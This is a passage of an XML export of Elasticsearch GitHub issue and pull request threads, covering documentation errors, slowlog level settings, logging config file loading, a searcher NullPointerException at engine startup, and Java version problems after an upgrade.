</comment><comment author="torrancew" created="2015-03-31T19:02:58Z" id="88210325">+1
</comment><comment author="anujsrc" created="2015-04-16T16:20:10Z" id="93776348">+1
</comment><comment author="SrikanthKS" created="2015-07-08T15:22:16Z" id="119623640">+1
</comment><comment author="xande" created="2015-07-22T19:35:49Z" id="123838680">+1
</comment><comment author="jjunqueira" created="2015-07-23T20:34:17Z" id="124232406">+1
</comment><comment author="kjelle" created="2015-08-19T21:03:39Z" id="132782789">+1
</comment><comment author="LxiaoGirl" created="2015-08-20T08:40:10Z" id="132939708">How to use this?
</comment><comment author="djwmarks" created="2015-08-28T22:32:27Z" id="135902822">+1
</comment><comment author="daguy666" created="2015-09-02T21:41:35Z" id="137252584">+1
</comment><comment author="kiwiz" created="2015-09-02T21:52:32Z" id="137255057">+1
</comment><comment author="orangey" created="2015-09-23T15:59:07Z" id="142647610">+1
</comment><comment author="german23" created="2015-09-29T10:36:47Z" id="144019603">+1
</comment><comment author="pemontto" created="2015-10-07T09:35:09Z" id="146132123">+1
</comment><comment author="jpountz" created="2015-11-20T15:51:43Z" id="158439203">Closed via #14773
</comment><comment author="ave19" created="2016-10-20T17:31:17Z" id="255173388">Our whole life is CIDR.  +infinity!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Documentation: error in reference on reverse nested aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7463</link><project id="" key="" /><description>The example search in the reverse_nested documentation (docs/reference/search/aggregations/bucket/reverse-nested-aggregation.asciidoc) is broken:

```
{
    "query" : {
    "match" : { "name" : "led tv" }
    }
    "aggs" : {
    "comments" : {
        "nested" : {
        "path" : "comments"
        },
        "aggs" : {
        "top_usernames" : {
            "terms" : {
            "field" : "comments.username"
            }
        },
        "aggs" : {
            "comment_to_issue" : {
            "reverse_nested" : {
            },
            "aggs" : {
                "top_tags_per_comment" : {
                "terms" : { "field" : "tags" }
                }
            }
            }
        }
        }
    }
    }
}
```

The missing comma ',' on line 4 aside, actually running the query (Elasticsearch 1.3.1) gives:

```
query[name:led name:tv],from[-1],size[-1]: Parse Failure [Could not find aggregator type [comment_to_issue] in [aggs]]]
```
</description><key id="41187688">7463</key><summary>Documentation: error in reference on reverse nested aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">antong</reporter><labels /><created>2014-08-26T15:49:38Z</created><updated>2014-09-02T10:41:00Z</updated><resolved>2014-09-02T10:41:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T10:41:00Z" id="54134788">Thanks for reporting. Fixed.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Documentation is missing for IndexingOperationListener</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7462</link><project id="" key="" /><description>Hey guys,

I would be interested in adding documentation about the IndexingOperationListener but I wanted to check if this was of interest and if so where would be the best place to add this information.

Thanks guys!
Kevin
</description><key id="41174707">7462</key><summary>Documentation is missing for IndexingOperationListener</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kkirsche</reporter><labels><label>docs</label></labels><created>2014-08-26T13:57:32Z</created><updated>2015-11-21T17:54:26Z</updated><resolved>2015-11-21T17:54:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-26T15:44:26Z" id="53442153">Hi @kkirsche 

IndexingOperationListener is probably a bit too low level for our existing docs.  Perhaps you could suggest improvements to the Javadocs?
</comment><comment author="kkirsche" created="2015-02-04T19:31:44Z" id="72921832">Sounds good. I'll look at revising this in the Java docs. I just asked as it is really a helpful thing to use when building plugins for elasticsearch. 

Would you be open though to a more complete "Plugins" section of the documentation http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-plugins.html

This does a fine job of showing you what's available but doesn't really offer much to help someone develop a new plugin.

Thoughts?

PS: Sorry, somehow this got buried in my alerts and I missed it.
</comment><comment author="dadoonet" created="2015-02-04T20:01:36Z" id="72927467">There is a plan to write such a doc. in the meantime, I found this page super useful: https://www.found.no/foundation/writing-a-plugin/

Hope this helps.
</comment><comment author="kkirsche" created="2015-02-04T20:05:55Z" id="72928307">Thanks :)
</comment><comment author="clintongormley" created="2015-11-21T17:54:26Z" id="158666571">No further feedback. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ElasticSearch ignores indexing slowlog log level settings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7461</link><project id="" key="" /><description>I am trying to tune how my indexing slowlogs are collected. I know that I can [set a threshold](https://github.com/elasticsearch/elasticsearch/blob/fdf1998f390bf1bb7741c133da7ea35e201f9aed/config/elasticsearch.yml#L364-L367) for how long an indexing op on a shard must take before it is logged. I would also like to be choose what level I'm logging at. It would appear that modifying [this line](https://github.com/elasticsearch/elasticsearch/blob/fdf1998f390bf1bb7741c133da7ea35e201f9aed/config/logging.yml#L21) in logging.yml would allow me to do this. However, unless I am misunderstanding the purpose of that setting, it is being ignored by ElasticSearch.

Here is how I came to that conclusion. I have ElasticSearch 1.3.2 running locally on my Mac. I put these [config files](https://gist.github.com/tdhopper/b3f07829ebd55dc5703f) in ~/es-config. This elasticsearch.yml file is bare-bones, as you can see. The logging.yml file only modifies [this line](https://github.com/elasticsearch/elasticsearch/blob/0b76b0bf79d340c8938afb03736f8a17f333939b/config/logging.yml#L21) of the default file. My assumption is that this should mean only WARN level indexing ops are logged. 

However, if I start an ES instance using 

```
elasticsearch --config="/Users/tdhopper/es-config/elasticsearch.yml"
```

and then run this Python script

``` python
import elasticsearch, time
es = elasticsearch.Elasticsearch(hosts="localhost")

while True:
    print ".",
    es.index(index="index1", doc_type="test_doc", body = {"hot_body": 1})
    time.sleep(.5)
```

my ~/es-logs/elasticsearch_index_indexing_slowlog.log file is immediately filled up with lines like 

```
[2014-08-22 10:24:52,162][INFO ][index.indexing.slowlog.index] [War Machine] [index1][2] took[1.4ms], took_millis[1], type[test_doc], id[WH83A0yvRHaQtQ34_6wncg], routing[], source[{"hot_body":1}]
[2014-08-22 10:24:52,666][INFO ][index.indexing.slowlog.index] [War Machine] [index1][1] took[1.5ms], took_millis[1], type[test_doc], id[sErCAr3BR_qWVfp0pnayGw], routing[], source[{"hot_body":1}]
```

That is, INFO level log statements while I specified WARN as the logging level.

I know that my logging.yml file is being read, because I was able to change the name of the slowlog file with `index_indexing_slow_log_file`. However, nothing seems to change when `index.indexing.slowlog` is modified.

[I brought this up](https://groups.google.com/forum/?fromgroups#!searchin/elasticsearch/tdhopper/elasticsearch/h1D0WkdPcAI/-yJkEJVbFCAJ) on the ES mailing list, but no one replied.
</description><key id="41170265">7461</key><summary>ElasticSearch ignores indexing slowlog log level settings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">tdhopper</reporter><labels><label>:Logging</label><label>adoptme</label><label>docs</label></labels><created>2014-08-26T13:11:19Z</created><updated>2017-03-30T12:21:27Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T17:53:55Z" id="158666444">Sorry it has taken a while to get to this. It does look like a bug to me, but I'm not entirely sure.
</comment><comment author="clintongormley" created="2016-11-25T18:44:59Z" id="263009994">The setting to control the level of search logging is `index.search.slowlog.level`

This should be added to the slow log docs https://www.elastic.co/guide/en/elasticsearch/reference/5.0/index-modules-slowlog.html#index-slow-log. Also, these settings are per index and are no longer allowed in the config file.  The docs should be updated to reflect this.</comment><comment author="gmoskovicz" created="2017-03-30T12:21:16Z" id="290394166">@clintongormley the default slowlog level is `TRACE`, but we can already control this by using `-1` in the threshold. Perhaps we could just remove the level settings for the slowlog and only configure this with the threshold?

Nowadays one can control this with the `level` setting, or `threshold` with `-1` or a specific value.</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mappings: The get field mappings API should raise an error when shards are not allocated</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7460</link><project id="" key="" /><description>The get fields mapping API is different from the get mappings since it goes to shards instead of the master node, since shards have per-field lookup structures that the master node doesn't have.

However, this can have some disappointing side effects in case no shards of the requested index are allocated: the API will return empty mappings. Instead this API should raise an error when shards are not allocated.
</description><key id="41168307">7460</key><summary>Mappings: The get field mappings API should raise an error when shards are not allocated</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Index APIs</label><label>adoptme</label><label>bug</label><label>low hanging fruit</label></labels><created>2014-08-26T12:50:53Z</created><updated>2016-11-25T18:37:19Z</updated><resolved>2016-11-25T18:37:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2016-11-25T18:37:19Z" id="263009318">Closing in favour of https://github.com/elastic/elasticsearch/issues/5368</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Java API: Add mapping(Object... source) simplified setter to PutIndexTemplateRequest</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7459</link><project id="" key="" /><description>As we did in https://github.com/elasticsearch/elasticsearch/commit/8919e7e602b9ec6d705fbc8c1e6186a5f92c03e8 for `CreateIndexRequest` and `PutMappingRequest`, add simplified `mapping(Object... source)` to PutIndexTemplateRequest and corresponding builder.
</description><key id="41165649">7459</key><summary>Java API: Add mapping(Object... source) simplified setter to PutIndexTemplateRequest</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T12:17:46Z</created><updated>2014-09-26T12:59:41Z</updated><resolved>2014-08-27T10:46:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>typo?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7458</link><project id="" key="" /><description /><key id="41165521">7458</key><summary>typo?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">missinglink</reporter><labels /><created>2014-08-26T12:15:53Z</created><updated>2014-08-26T13:27:02Z</updated><resolved>2014-08-26T13:27:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>LogConfigurator resolveConfig  also reads .rpmnew or .bak files</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7457</link><project id="" key="" /><description>Currently the LogConfigurator will attempt to read any file that starts with "logging." in the env.configFile() path.

A common practise is to suffix files with .bak or in case of package managers they often add a suffix if the file has been modified upstream.

Elasticsearch will read those values anyway and that might lead to very confusing logging behaviour.

I am not sure how to best approach this, either have a whitelist or a backlist of suffixes that are allowed/disallowed ?
</description><key id="41164961">7457</key><summary>LogConfigurator resolveConfig  also reads .rpmnew or .bak files</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">mfussenegger</reporter><labels><label>:Settings</label><label>bug</label><label>v1.4.1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T12:07:57Z</created><updated>2015-06-08T00:33:19Z</updated><resolved>2014-11-19T11:21:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-11T07:02:52Z" id="55227428">This only allows for loading of `.yaml` files, however `LogConfigurator.loadConfig()` calls `SettingsBuilder.loadFromUrl()`, which is also able to load `json` and `properties` files. Should we cater for this as well? What do you think?
</comment><comment author="mfussenegger" created="2014-09-11T09:13:18Z" id="55239091">I've added a fixup commit which includes your suggested changes.

Not sure about json, I don't really mind to add support for json files, but I guess then it should also be documented? Actually in the documentation it mentions that just "logging.yml" is loaded so the implementation here doesn't quite match the behaviour, but I didn't want to break backward compatibility.
</comment><comment author="javanna" created="2014-11-12T10:50:46Z" id="62700809">Hi @mfussenegger sorry it took a while to give you some more feedback, thanks a lot for updating your PR. I think it's really close and I would eventually address loading of `json` or `properties` files in a different issue. I left two minor comments, if you can address those this is ready to go. Maybe we could also add to the docs [here](https://github.com/elasticsearch/elasticsearch/blob/master/docs/reference/setup/configuration.asciidoc) that we load the `logging.yaml` (not only `logging.yml`). 
</comment><comment author="mfussenegger" created="2014-11-12T11:11:44Z" id="62703170">Hi @javanna thanks for the feedback. I've added another fixup with the changes you mentioned.
</comment><comment author="javanna" created="2014-11-12T11:32:32Z" id="62705392">Hey @mfussenegger I apologize but I just realized that in fact we currently support both `json` and `properties` formats while with this PR we would remove support for them. So @spinscale was right, we should expand to `logging.properties` and `logging.json`. Also I would update the docs page by briefly adding the supported formats. And if you feel like it, we could add a couple of tests that verify that the json and properties format work (otherwise I will do it afterwards).
</comment><comment author="clintongormley" created="2014-11-12T13:22:00Z" id="62716502">This logic should also be applied to eg `config/elasticsearch.yml` etc, as we're seeing the same issues there.
</comment><comment author="javanna" created="2014-11-12T15:33:04Z" id="62736454">Going to open a separate issue for other config files, let's focus exclusively on logging on this PR. @mfussenegger after some thinking I find your initial approach better than what I suggested, since we support multiple logging configuration files that get merged. Thus we can leave it at logging.*.suffix where suffix is either yaml, yml, json or properties. This solution would be more flexible and backwards compatible and at the same time fix the original problem. Thanks a lot for your help and sorry for changing direction :)
</comment><comment author="mfussenegger" created="2014-11-12T17:01:14Z" id="62752529">K, I'll look into the json/properties support and update the PR accordingly. But might take a bit until I get back to this.
</comment><comment author="javanna" created="2014-11-12T17:25:43Z" id="62756653">@mfussenegger thanks again!
@clint regarding your comment on `config/elasticsearch.yml` etc. I double checked and it seems like only `logging.yml` suffers from this problem, `elasticsearch.yml` gets loaded by explicit name, so I am not wrong there's no need to create another issue ;)
</comment><comment author="mfussenegger" created="2014-11-18T13:07:27Z" id="63468071">I've updated the PR so that `.json` and `.properties` are also allowed suffixes. 

Also rebased it with current master and already squashed the first few commits.
</comment><comment author="javanna" created="2014-11-18T13:57:47Z" id="63474044">Thanks @mfussenegger it's very close, I left one minor comment on making the filename case-insensitive and one more around testing. Let me know if you have any question.
</comment><comment author="mfussenegger" created="2014-11-18T19:34:25Z" id="63530563">Added another fixup.
</comment><comment author="javanna" created="2014-11-19T11:22:08Z" id="63625871">Thanks a lot @mfussenegger I just merged this.
</comment><comment author="jpountz" created="2014-11-21T09:56:38Z" id="63948504">@javanna should this fix go to 1.3.6?
</comment><comment author="javanna" created="2014-11-21T10:15:49Z" id="63950953">@jpountz why not. will backport it shortly.
</comment><comment author="javanna" created="2014-11-21T10:57:58Z" id="63955424">hey @jpountz I looked into backporting but that would require other changes that have not been backported: https://github.com/elasticsearch/elasticsearch/commit/59307408 .
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Wait until engine is started up when acquiring searcher</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7456</link><project id="" key="" /><description>Today we have a small window where a searcher can be acquired but the
engine is in the state of starting up. This causes a NPE triggering a
shard failure if we are fast enough. This commit fixes this situation
gracefully.

Closes #7455
</description><key id="41163896">7456</key><summary>Wait until engine is started up when acquiring searcher</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T11:56:20Z</created><updated>2015-06-07T19:00:37Z</updated><resolved>2014-08-26T12:12:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-26T12:00:44Z" id="53410143">LGTM
</comment><comment author="ajhalani" created="2014-09-30T15:28:43Z" id="57332019">We are seeing an issue with v1.3.2 which may be related to this. Would really appreciate if someone could confirm it's indeed related or not.. 

After node restart, sometimes one of the shard's recovery is indefinitely stuck with no updates after the trace `[index.engine.internal    ] [linux01.node] [myindex][0] starting engine`. Doing hot threads (few times with a minute break), get dumps like below - 

```
   102.9% (514.5ms out of 500ms) cpu usage by thread 'elasticsearch[linux01.node][generic][T#5]'
     10/10 snapshots sharing following 15 elements
       java.util.Collections$UnmodifiableCollection$1.hasNext(Collections.java:1066)
       org.elasticsearch.index.engine.internal.InternalEngine$SearchFactory.newSearcher(InternalEngine.java:1561)
       org.apache.lucene.search.SearcherManager.getSearcher(SearcherManager.java:160)
       org.apache.lucene.search.SearcherManager.refreshIfNeeded(SearcherManager.java:122)
       org.apache.lucene.search.SearcherManager.refreshIfNeeded(SearcherManager.java:58)
       org.apache.lucene.search.ReferenceManager.doMaybeRefresh(ReferenceManager.java:176)
       org.apache.lucene.search.ReferenceManager.maybeRefresh(ReferenceManager.java:225)
       org.elasticsearch.index.engine.internal.InternalEngine.refresh(InternalEngine.java:766)
       org.elasticsearch.index.engine.internal.InternalEngine.delete(InternalEngine.java:686)
       org.elasticsearch.index.shard.service.InternalIndexShard.performRecoveryOperation(InternalIndexShard.java:780)
       org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:250)
       org.elasticsearch.index.gateway.IndexShardGatewayService$1.run(IndexShardGatewayService.java:132)
       java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
       java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
       java.lang.Thread.run(Thread.java:722)
```
</comment><comment author="clintongormley" created="2014-10-14T13:22:37Z" id="59041765">@bleskes can you confirm that https://github.com/elasticsearch/elasticsearch/pull/7456#issuecomment-57332019 is a symptom of this (fixed) issue?
</comment><comment author="bleskes" created="2014-10-14T13:34:50Z" id="59043668">@clintongormley this bug caused an NPE (because a variable was not set yet). The stack trace is indicating that the recovery is in it's translog phase, meaning the engine has already started.

@ajhalani it looks like you use a lot of delete-by-query operations. Is that true? Those are replayed when you recover the shard, which takes longer then simple indexing (and we refresh after them by default, which is not needed during recovery - a potential optimization we can do here).
</comment><comment author="ajhalani" created="2014-10-14T15:34:32Z" id="59065680">Thanks for response. 

@bleskes  - you're right. My issue didn't seem to be related to this. It was indeed due to slowness in recovery from translog. In hot threads dump, I see frequent refresh and flush, and it was much slower than regular indexing.. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Wait until engine has started up when acquiring searcher</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7455</link><project id="" key="" /><description>This exception happened after a node restart and a delete-by-query hits the node immediately. Happened on 1.3.1

```
[2014-08-25 16:34:50,926][ERROR][index.engine.internal    ] [node_name] [2013_09][3] failed to acquire searcher, source delete_by_query
java.lang.NullPointerException
    at org.elasticsearch.index.engine.internal.InternalEngine.acquireSearcher(InternalEngine.java:694)
    at org.elasticsearch.index.shard.service.InternalIndexShard.acquireSearcher(InternalIndexShard.java:653)
    at org.elasticsearch.action.deletebyquery.TransportShardDeleteByQueryAction.shardOperationOnReplica(TransportShardDeleteByQueryAction.java:139)
    at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$ReplicaOperationTransportHandler.messageReceived(TransportShardReplicationOperationAction.java:242)
    at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$ReplicaOperationTransportHandler.messageReceived(TransportShardReplicationOperationAction.java:221)
    at org.elasticsearch.transport.netty.MessageChannelHandler$RequestHandler.run(MessageChannelHandler.java:275)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:744)
[2014-08-25 16:34:50,927][WARN ][index.engine.internal    ] [node_name] [2013_09][3] failed engine [deleteByQuery/shard failed on replica]
[2014-08-25 16:35:13,744][WARN ][cluster.action.shard     ] [node_name] [2013_09][3] sending failed shard for [2013_09][3], node[0Y7oOI64Qea6GCaSh3OtLw], [R], s[INITIALIZING], indexUUID [_na_], reason [engine failure, message [deleteByQuery/shard failed on replica][EngineException[[2013_09][3] failed to acquire searcher, source delete_by_query]; nested: NullPointerException; ]]
```
</description><key id="41163317">7455</key><summary>Internal: Wait until engine has started up when acquiring searcher</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">spinscale</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T11:50:24Z</created><updated>2014-09-08T15:05:55Z</updated><resolved>2014-08-26T12:12:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Made template filtering generic and extensible</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7454</link><project id="" key="" /><description>Added the ability to register index template filters that are being applied when a new index is created, in order to decide whether a matching index template should be applied or not. The default filter that checks whether the template pattern matches the index name always runs first, additional filters can also be registered so that templates can be filtered out based on custom logic.

Took the chance to add the handy `source(Object... source)` method to `PutIndexTemplateRequest` and corresponding builder.

Closes #7459
</description><key id="41162244">7454</key><summary>Made template filtering generic and extensible</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Index Templates</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T11:38:29Z</created><updated>2015-06-06T18:21:40Z</updated><resolved>2014-08-27T10:46:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-26T11:45:02Z" id="53408005">@imotov since you had a look at the original PR from @uboness, can you have a look at this one? ;)
</comment><comment author="imotov" created="2014-08-26T12:25:50Z" id="53412519">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Issues after ES 1.3.2 upgrade</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7453</link><project id="" key="" /><description>After upgrade to ES 1.3.2 I'm facing the following issues:

1) On startup got error:
[2014-08-26 11:10:20,285][ERROR][bootstrap                ] {1.3.2}: Initialization Failed ...
1) NoSuchMethodError[org.elasticsearch.discovery.zen.ZenDiscovery.&lt;init&gt;(Lorg/elasticsearch/common/settings/Settings;Lorg/elasticsearch/cluster/ClusterName;Lorg/elasticsearch/threadpool/ThreadPool;Lorg/elasticsearch/transport/TransportService;Lorg/elasticsearch/cluster/ClusterService;Lorg/elasticsearch/node/settings/NodeSettingsService;Lorg/elasticsearch/cluster/node/DiscoveryNodeService;Lorg/elasticsearch/discovery/zen/ping/ZenPingService;Lorg/elasticsearch/Version;)V]2) IllegalStateException[This is a proxy used to support circular references involving constructors. The object we're proxying is not constructed yet. Please wait until after injection has completed to use this object.]

2) when I attempt to upgrade the cloud-aws plugin to version 2.3.0 (compatible with ES 1.3) I get:
Exception in thread "main" java.lang.UnsupportedClassVersionError: org/elasticsearch/plugins/PluginManager : Unsupported major.minor version 51.0
        at java.lang.ClassLoader.defineClass1(Native Method)
        at java.lang.ClassLoader.defineClass(ClassLoader.java:643)
        at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
        at java.net.URLClassLoader.defineClass(URLClassLoader.java:277)
        at java.net.URLClassLoader.access$000(URLClassLoader.java:73)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:212)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:205)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:323)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:294)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:268)
Could not find the main class: org.elasticsearch.plugins.PluginManager. Program will exit.

Java version is:
java version "1.7.0_45"
OpenJDK Runtime Environment (amzn-2.4.3.2.32.amzn1-x86_64 u45-b15)
OpenJDK 64-Bit Server VM (build 24.45-b08, mixed mode)
</description><key id="41162033">7453</key><summary>Issues after ES 1.3.2 upgrade</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">praj2</reporter><labels /><created>2014-08-26T11:35:43Z</created><updated>2015-01-04T03:58:28Z</updated><resolved>2014-08-27T05:50:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="praj2" created="2014-08-27T04:19:18Z" id="53525248">Same issue faced with ES versions 1.3.1 and 1.3.0
Surprisingly ES v1.3.2 works fine on java version "1.7.0_25"
</comment><comment author="praj2" created="2014-08-27T05:50:43Z" id="53529277">Since ES 1.2 java 6 is no longer supported (https://github.com/elasticsearch/elasticsearch/issues/6313).
We fixed the issue by setting our JAVA_HOME correctly.
</comment><comment author="gwulfs" created="2015-01-04T03:58:28Z" id="68620108">Install Java 7: 
http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html

and run:
echo export "JAVA_HOME=\$(/usr/libexec/java_home)" &gt;&gt; ~/.bash_profile
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>test: write heap dump to log folder</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7452</link><project id="" key="" /><description>Follow up to #7370
Per default the heap dump is written to target/JX/pidXYZ.hprof
In order to keep them when a new test is is started, they
should be written to log folder which is not cleared in a new
test run.
